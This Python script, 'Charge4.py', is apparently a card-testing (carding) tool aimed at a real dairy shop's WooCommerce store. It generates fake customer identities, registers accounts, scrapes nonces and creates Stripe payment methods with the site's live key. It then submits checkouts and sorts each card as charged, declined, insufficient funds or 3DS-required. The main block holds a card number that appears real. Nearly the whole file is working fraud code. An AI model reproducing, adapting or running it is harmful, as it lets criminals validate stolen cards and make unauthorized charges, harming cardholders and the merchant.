# Filename: Charge4.py (CONTAINS Charge6 LOGIC for bgdfreshmilk.com)
# Attempts Registration + Add Cart + PM Create + Dynamic Nonce Fetch + Checkout
# Uses GENERATED User details + SPECIFIC Address + DYNAMIC Nonces + DYNAMIC Delivery Date.

import requests
import re
import json
import random
import string
import time
from urllib.parse import quote_plus
from bs4 import BeautifulSoup
from datetime import datetime, timedelta # Import datetime tools

# --- Generation Functions (Copied from original Charge6.py) ---
def generate_random_string(length, chars=string.ascii_lowercase + string.digits):
    """Generates a random string of specified length."""
    return ''.join(random.choice(chars) for _ in range(length))

def generate_first_name(length=7):
    """Generates a random first name."""
    # Use common first names list instead of random strings for realism
    first_names_list = ["Michael", "Christopher", "Jessica", "Matthew", "Ashley", "Jennifer", "Joshua", "Amanda", "Daniel", "David", "James", "Robert", "John", "Joseph", "Andrew", "Ryan", "Brandon", "Jason", "Justin", "Sarah", "William", "Jonathan", "Stephanie", "Brian", "Nicole", "Nicholas", "Anthony", "Heather", "Eric", "Elizabeth", "Emily", "Olivia", "Sophia", "Emma", "Ava", "Isabella", "Mia", "Abigail", "Madison", "Charlotte", "Liam", "Noah", "Jacob", "Ethan", "Alexander", "William", "Benjamin", "Lucas", "Henry"]
    return random.choice(first_names_list)

def generate_last_name(length=9):
    """Generates a random last name."""
    # Use common last names list
    last_names_list = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Martin", "Jackson", "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson", "Walker", "Young", "Allen", "King", "Wright", "Scott", "Green", "Baker", "Adams", "Nelson", "Carter"]
    return random.choice(last_names_list)

def generate_email_username(first, last, length=4):
    """Generates a username part for email/account."""
    num = generate_random_string(length, string.digits)
    sep = random.choice(['.', '_', ''])
    return f"{first.lower()}{sep}{last.lower()}{num}"

def generate_phone(length=10):
    """Generates a random string of digits."""
    return generate_random_string(length, string.digits)

def generate_password(length=12):
    """Generates a random password."""
    chars = string.ascii_letters + string.digits # Simpler password
    return generate_random_string(length, chars)

# --- Main Checker Function (Logic from Charge6.py) ---
# Renamed function slightly to avoid confusion if you have both files
def BGDCheckoutLogic(ccx):
    """
    Contains the logic from Charge6.py targeting bgdfreshmilk.com.
    Attempts Registration + Stripe Charge via bgdfreshmilk.com using generated
    user details, specific address, dynamic nonces, and dynamic delivery date.

    Args: ccx (str): Card details "NUMBER|MM|YY|CVC".
    Returns: str: Status message, potentially including redirect URL on success.
    """
    ccx = ccx.strip(); parts = ccx.split("|")
    if len(parts) != 4: return "Error: Invalid card format. Use NUM|MM|YY|CVC"
    n, mm, yy, cvc = parts
    if not (n.isdigit() and mm.isdigit() and yy.isdigit() and cvc.isdigit()): return "Error: Card parts must be numeric"
    if len(yy) == 4 and yy.startswith("20"): yy = yy[2:]
    elif len(yy) != 2: return f"Error: Invalid year format: {yy}. Use YY or 20YY."

    # --- Generate User Details ---
    first_name = generate_first_name()
    last_name = generate_last_name()
    email_user_part = generate_email_username(first_name, last_name)
    email_domain = random.choice(["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"])
    email = f"{email_user_part}@{email_domain}"
    account_username = email_user_part # Use email part as username
    account_password = generate_password()
    phone = generate_phone()

    # --- USE SPECIFIC VALID ADDRESS (From Charge6.py) ---
    street = "80 Brock Rd S"
    city = "Aberfoyle"
    state = "ON"
    postal_code = "N1H 6H9" # Use the valid one provided
    country = "CA"
    company = ""

    # --- Generate Dynamic Delivery Date (From Charge6.py) ---
    try:
        future_date = datetime.now() + timedelta(days=random.randint(3, 6)) # Deliver 3-6 days from now
        h_deliverydate = future_date.strftime("%d-%m-%Y")
        e_deliverydate_raw = future_date.strftime("%d %B, %Y")
        # Ensure proper encoding, especially for commas if present in month names
        e_deliverydate = quote_plus(e_deliverydate_raw)
    except Exception as date_err: return f"Error: Generating delivery date: {date_err}"


    session = requests.Session() # Use session for cookies
    session.headers.update({
        # Using a common desktop UA might be slightly better sometimes
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
        #'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    })

    # --- Step 0.1: Fetch My Account Page for Registration Nonce ---
    my_account_url = 'https://bgdfreshmilk.com/my-account/'
    reg_nonce = None
    try:
        headers_get_reg = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'referer': 'https://bgdfreshmilk.com/'}
        response_get_reg = session.get(my_account_url, headers=headers_get_reg, timeout=20)
        response_get_reg.raise_for_status()
        soup = BeautifulSoup(response_get_reg.text, 'lxml')
        nonce_input_reg = soup.find('input', {'id': 'woocommerce-register-nonce'}) or soup.find('input', {'name': 'woocommerce-register-nonce'})
        if nonce_input_reg and nonce_input_reg.get('value'):
            reg_nonce = nonce_input_reg['value']
        else: # Regex fallback
            reg_nonce_match = re.search(r'name=["\']woocommerce-register-nonce["\']\s+value=["\'](\w+)["\']', response_get_reg.text)
            if reg_nonce_match: reg_nonce = reg_nonce_match.group(1)

    except Exception as e: return f"Error: Fetching/Parsing My Account page: {e}"

    # --- Step 0.2: Submit Registration ---
    headers_post_reg = {
        'authority': 'bgdfreshmilk.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://bgdfreshmilk.com',
        'referer': 'https://bgdfreshmilk.com/my-account/', 'upgrade-insecure-requests': '1'
    }
    # Ensure correct field names for BGD Fresh Milk registration
    data_register = {'username': account_username, 'email': email, 'password': account_password,
                     'woocommerce-register-nonce': reg_nonce, '_wp_http_referer': '/my-account/', 'register': 'Register'}
    try:
        response_register = session.post(my_account_url, headers=headers_post_reg, data=data_register, timeout=25, allow_redirects=True) # Allow redirects helps see final state
        response_register.raise_for_status()
        # Check for errors *after* potential redirects
        reg_soup = BeautifulSoup(response_register.text, 'lxml')
        error_elements = reg_soup.select('ul.woocommerce-error li, div.woocommerce-error, .woocommerce-error')
        if error_elements:
             errors = [err.get_text(strip=True) for err in error_elements]; error_message = ". ".join(errors)
             if 'an account is already registered with your email address' in error_message.lower(): return "Error: Registration Failed (Email/User Exists)"
             if 'captcha' in error_message.lower(): return "Error: Registration Failed (CAPTCHA Required)"
             return f"Error: Registration Failed ({error_message[:100]}...)"
    except Exception as e: return f"Error: Submitting Registration failed: {e}"

    # --- Step 1: Add Product to Cart (Using BGD Fresh Milk specific AJAX) ---
    add_cart_url = 'https://bgdfreshmilk.com/' # Base URL for AJAX
    headers_step1 = {
        'authority': 'bgdfreshmilk.com', 'accept': 'application/json, text/javascript, */*; q=0.01',
        'origin': 'https://bgdfreshmilk.com', 'referer': 'https://bgdfreshmilk.com/product/curd/', # Referer from a product page
        'x-requested-with': 'XMLHttpRequest'
    }
    params_step1 = {'wc-ajax': 'grogin_add_to_cart'} # BGD Fresh Milk specific action
    # Use 'files' for multipart/form-data as seen in original Charge6
    files_step1 = {'quantity': (None, '1'), 'add-to-cart': (None, '3765')} # BGD Fresh Milk product ID
    try:
        response_step1 = session.post(add_cart_url, params=params_step1, headers=headers_step1, files=files_step1, timeout=15)
        response_step1.raise_for_status()
    except Exception as e: return f"Error: Add to Cart failed (after reg): {e}"

    # --- Step 2: Create Stripe Payment Method ---
    headers_pm = {'authority': 'api.stripe.com', 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': session.headers['User-Agent']}
    encoded_name = quote_plus(f"{first_name} {last_name}"); encoded_email = quote_plus(email)
    enc_city, enc_line1, enc_postal, enc_state, enc_country = quote_plus(city), quote_plus(street), quote_plus(postal_code), quote_plus(state), quote_plus(country)
    # Using BGD Fresh Milk's PK and static metadata from original Charge6
    data_pm_template = 'billing_details[name]={name}&billing_details[email]={email}&billing_details[phone]={phone}&billing_details[address][city]={city}&billing_details[address][country]={country}&billing_details[address][line1]={line1}&billing_details[address][line2]=&billing_details[address][postal_code]={postal}&billing_details[address][state]={state}&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F641fa38fe2%3B+stripe-js-v3%2F641fa38fe2%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fbgdfreshmilk.com&time_on_page=23306&client_attribution_metadata[client_session_id]=113a9d9b-9228-4c9c-86ab-432ce98b738d&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=6510bfda-7671-4bbf-90d1-506145a864c5af715c&muid=d4b2e71e-8c90-4fec-8349-7ef8b07ea847a75a2f&sid=3876bcbf-ed11-4c17-802a-2abb8ce27177f54fe8&key=pk_live_51PzrApB0yQnnqbcvJrqVt18FlKux75xSa26hDJizOdZK5YrrAo2vP4cbFf5RQA7xFaMS0SrAo5DjoWnxM1S7ZubI00Hfs8PfBv&_stripe_version=2024-06-20'
    n_no_spaces = n.replace(' ', '').replace('+','')
    data_pm = data_pm_template.format(name=encoded_name, email=encoded_email, phone=phone, city=enc_city, country=enc_country, line1=enc_line1, postal=enc_postal, state=enc_state, n=n_no_spaces, mm=mm, yy=yy, cvc=cvc)
    pm = None
    try:
        response_pm = session.post('https://api.stripe.com/v1/payment_methods', headers=headers_pm, data=data_pm, timeout=20) # Increased timeout slightly
        if response_pm.status_code == 402:
             try:
                 msg = response_pm.json().get('error', {}).get('message', "Stripe Error: Card declined (402)")
                 msg_lower = msg.lower()
                 if 'insufficient_funds' in msg_lower or 'insufficient_funds' in msg_lower: return "Insufficient funds."
                 if 'incorrect_cvc' in msg_lower or 'invalid_cvc' in msg_lower or 'security code is incorrect' in msg_lower: return "Your card's security code is incorrect."
                 if 'expired_card' in msg_lower: return "Your card has expired."
                 if 'postal_code' in msg_lower: return "Declined (AVS - Postal Code)"
                 if 'address_line1' in msg_lower: return "Declined (AVS - Address)"
                 if 'card was declined' in msg_lower or 'generic_decline' in msg_lower: return "Your card was declined."
                 if 'pickup_card' in msg_lower: return "Declined (Pickup Card)"
                 if 'do_not_honor' in msg_lower: return "Declined (Do Not Honor)"
                 return msg # Return specific Stripe message
             except Exception: return "Error: Stripe card declined (HTTP 402 - Non-JSON Response)"
        response_pm.raise_for_status() # Raise for other non-402 errors
        pm_json = response_pm.json(); pm = pm_json.get('id')
        if not pm:
            err_msg = pm_json.get('error', {}).get('message', 'Unknown error: PM ID missing')
            return f"Error: Stripe PM creation failed: {err_msg}"
    except requests.exceptions.RequestException as e: return f"Error: Stripe PM network request failed: {e}"
    except Exception as e: return f"Error: Stripe PM creation failed (General): {e}"
    # Removed redundant `if not pm:` check here

    # --- Step 2.5: Fetch Checkout Page for Checkout Nonce ---
    checkout_url = 'https://bgdfreshmilk.com/checkout/'
    headers_get_checkout = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'referer': my_account_url, 'user-agent': session.headers['User-Agent']}
    checkout_nonce = None
    try:
        response_get_checkout = session.get(checkout_url, headers=headers_get_checkout, timeout=20)
        response_get_checkout.raise_for_status()
        soup = BeautifulSoup(response_get_checkout.text, 'lxml')
        nonce_input = soup.find('input', {'id': 'woocommerce-process-checkout-nonce'}) or soup.find('input', {'name': 'woocommerce-process-checkout-nonce'})
        if nonce_input and nonce_input.get('value'):
            checkout_nonce = nonce_input['value']
        else: # Regex fallback
            nonce_match = re.search(r'name=["\']woocommerce-process-checkout-nonce["\']\s+value=["\'](\w+)["\']', response_get_checkout.text)
            if nonce_match: checkout_nonce = nonce_match.group(1)

    except Exception as e: return f"Error: Fetching/Parsing Checkout page failed: {e}"

    # --- Step 3: Process Checkout (Using BGD Fresh Milk specific payload) ---
    checkout_ajax_url = 'https://bgdfreshmilk.com/' # Base URL for checkout AJAX
    headers_step3 = {'authority': 'bgdfreshmilk.com', 'accept': 'application/json, text/javascript, */*; q=0.01', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://bgdfreshmilk.com', 'referer': 'https://bgdfreshmilk.com/checkout/', 'x-requested-with': 'XMLHttpRequest', 'user-agent': session.headers['User-Agent']}
    params_step3 = {'wc-ajax': 'checkout'} # Standard WC AJAX parameter
    enc_first_name, enc_last_name, enc_email = quote_plus(first_name), quote_plus(last_name), quote_plus(email)
    enc_city, enc_line1, enc_postal, enc_state, enc_country = quote_plus(city), quote_plus(street), quote_plus(postal_code), quote_plus(state), quote_plus(country)
    # BGD Fresh Milk specific payload format from original Charge6
    data_step3_template = 'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Fbgdfreshmilk.com%2Fshop%2F&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fbgdfreshmilk.com%2Fproduct%2Fcurd%2F&wc_order_attribution_session_start_time=2025-04-24+18%3A23%3A01&wc_order_attribution_session_pages=4&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Linux%3B+Android+10%3B+K)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F137.0.0.0+Mobile+Safari%2F537.36&billing_first_name={fname}&billing_last_name={lname}&billing_company=&billing_country={country}&billing_floor=basement&billing_address_1={line1}&billing_address_2=&billing_city={city}&billing_state={state}&billing_postcode={postal}&billing_phone={phone}&billing_additional_phone=&billing_email={email}&h_deliverydate={h_date}&e_deliverydate={e_date}&shipping_first_name={fname}&shipping_last_name={lname}&shipping_company=&shipping_country={country}&shipping_address_1={line1}&shipping_address_2=&shipping_city={city}&shipping_state={state}&shipping_postcode={postal}&order_comments=&shipping_method%5B0%5D=local_pickup%3A11&payment_method=stripe&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=&wc-stripe-is-deferred-intent=1&terms=on&terms-field=1&woocommerce-process-checkout-nonce={nonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&wc-stripe-payment-method={pm}'
    data_step3 = data_step3_template.format(fname=enc_first_name, lname=enc_last_name, email=enc_email, phone=phone, country=enc_country, line1=enc_line1, city=enc_city, state=enc_state, postal=enc_postal, h_date=h_deliverydate, e_date=e_deliverydate, pm=pm, nonce=checkout_nonce)

    try:
        response_checkout = session.post(checkout_ajax_url, params=params_step3, headers=headers_step3, data=data_step3, timeout=35) # Increased timeout
        if response_checkout.status_code == 403: return "Error: Checkout Request Blocked (HTTP 403 / Invalid Session or Nonce?)"
        if response_checkout.status_code == 423: return "Error: Checkout Request Locked (HTTP 423)"
        # Don't raise_for_status here, parse content first
        # response_checkout.raise_for_status() # Avoid raising for potential JSON errors inside 200 OK

        # Try parsing JSON response first
        try:
            result = response_checkout.json()

            if result.get('result') == 'success':
                redirect_url = result.get('redirect', '')
                if redirect_url:
                     # Check for 3DS/Action keywords in redirect URL
                    if any(kw in redirect_url.lower() for kw in ["confirm", "_secret", "verify", "authenticate", "authentication_required", "challenge", "three_d_secure", "hooks.stripe"]):
                         return "3DS/Redirect Required" # Use consistent 3DS message
                    else:
                         return f"Charged | {redirect_url}" # Success redirect
                else: return "Charged | Success (No Redirect URL)" # Success but no URL

            # Check specifically for Stripe requires_action before generic failure
            elif result.get('status') == 'requires_action' or 'requires_action' in str(result).lower():
                 return "3DS/Action Required" # Use consistent 3DS message

            elif result.get('result') == 'failure':
                messages_html = result.get('messages', '')
                messages_text = re.sub('<[^>]+>', ' ', messages_html).strip().replace('\n', ' ').lower() # Cleaned text

                # --- DETAILED FAILURE PARSING (from Charge6 original) ---
                if 'cut-off time for the selected date has expired' in messages_text: return "Declined (Checkout Error: Delivery Date Cut-off)"
                if 'account username is a required field' in messages_text: return "Declined (Checkout Error: Account Required - Login Failed?)"
                if 'billing postal code is not a valid postcode' in messages_text: return "Declined (Checkout Error: Invalid Postal Code)"
                if 'unable to process your order' in messages_text: return "Declined (Checkout Error: Unable to process)"

                # Parse Stripe errors relayed in the failure message
                if 'insufficient funds' in messages_text: return "Insufficient funds."
                if 'incorrect card number' in messages_text: return "Your card number is incorrect."
                if 'security code is incorrect' in messages_text or 'invalid cvc' in messages_text: return "Your card's security code is incorrect."
                if 'card has expired' in messages_text: return "Your card has expired."
                if 'postal code is invalid' in messages_text: return "Declined (AVS - Postal Code)"
                if 'address is invalid' in messages_text: return "Declined (AVS - Address)"
                if 'card was declined' in messages_text: return "Your card was declined."
                if 'do not honor' in messages_text: return "Declined (Do Not Honor)"
                if 'pickup card' in messages_text: return "Declined (Pickup Card)"
                # --- END DETAILED FAILURE PARSING ---

                # Generic failure message if nothing specific matched
                if messages_text: return f"Declined ({messages_text[:100]}{'...' if len(messages_text)>100 else ''})"
                else: return "Declined (Checkout Failed, Reason Unknown)"
            else:
                # Unknown JSON structure
                return f"Unknown Checkout JSON Response: {str(result)[:150]}..."
        # --- End JSON Parsing ---

        except json.JSONDecodeError: # Handle HTML response if JSON parsing fails
            html_text = response_checkout.text.lower()
             # Check for obvious success indicators in HTML
            if 'order received' in html_text or 'thank you for your order' in html_text or 'order number is:' in html_text:
                return "Charged | Success Page (HTML Response)"
            # Check for common errors in HTML from original Charge6
            if 'cut-off time for the selected date has expired' in html_text: return "Declined (Checkout Error: Delivery Date Cut-off)"
            if 'account username is a required field' in html_text: return "Declined (Checkout Error: Account Required - Login Failed?)"
            if 'billing postal code is not a valid postcode' in html_text: return "Declined (Checkout Error: Invalid Postal Code)"
            if 'unable to process your order' in html_text: return "Declined (Checkout Error: Unable to process)"
            # Add more specific HTML error checks if needed
            return f"Non-JSON Checkout Response (Status {response_checkout.status_code}): {response_checkout.text[:100]}..."

    except requests.exceptions.Timeout: return "Error: Timeout during Checkout (Step 3)"
    except requests.exceptions.RequestException as e:
        status = getattr(e.response, 'status_code', None); status_info = f"(HTTP {status})" if status else ""
        text = getattr(e.response, 'text', str(e))[:100] + "..."; return f"Error: Network error during Checkout (Step 3) {status_info}: {text}"
    except Exception as e: return f"Error: Unexpected error during Checkout (Step 3): {e}"

# --- Example Usage Block ---
if __name__ == "__main__":
    # Replace with a test card in the format "NUMBER|MM|YY|CVC"
    test_cc = "4766642753030365|10|26|584" # <<< PUT A VALID TEST CARD HERE

    if "TEST_CARD_HERE" in test_cc:
        print("Please replace 'VISA_OR_MC_TEST_CARD_HERE' with an actual card number for testing.")
    else:
        print(f"Attempting checkout (Charge6 Logic) for: {test_cc.split('|')[0][:4]}********")
        result = BGDCheckoutLogic(test_cc) # Call the function containing Charge6 logic
        print("\n--- Checkout Result (BGD Fresh Milk Logic inside Charge4.py) ---")
        print(result) # Print the final status message directly
        print("--- End of Result ---")